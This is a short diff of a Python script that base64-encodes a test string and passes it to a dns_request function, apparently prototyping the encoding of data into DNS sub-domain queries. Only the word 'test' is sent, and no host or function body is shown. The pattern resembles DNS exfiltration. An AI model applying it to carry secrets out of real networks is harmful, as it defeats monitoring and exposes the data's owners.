@@ -12,10 +12,13 @@ def dns_request(sub_domain):
 
 text = "test"
 text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
+#text_decodeTest = base64.urlsafe_b64decode(text_bytes).decode('ascii', errors='ignore')
 print("text_bytes", text_bytes)
-chunks = [text_bytes[i:i+6] for i in range(0, len(text_bytes), 6)]
 
-for chunk in chunks:
-    print(chunk)
-    #dns_request(chunk.decode('utf-8').rstrip('='))
-    dns_request(text_bytes)
+dns_request(text_bytes)
+# chunks = [text_bytes[i:i+6] for i in range(0, len(text_bytes), 6)]
+
+# for chunk in chunks:
+#     print(chunk)
+#     #dns_request(chunk.decode('utf-8').rstrip('='))
+#     dns_request(text_bytes)
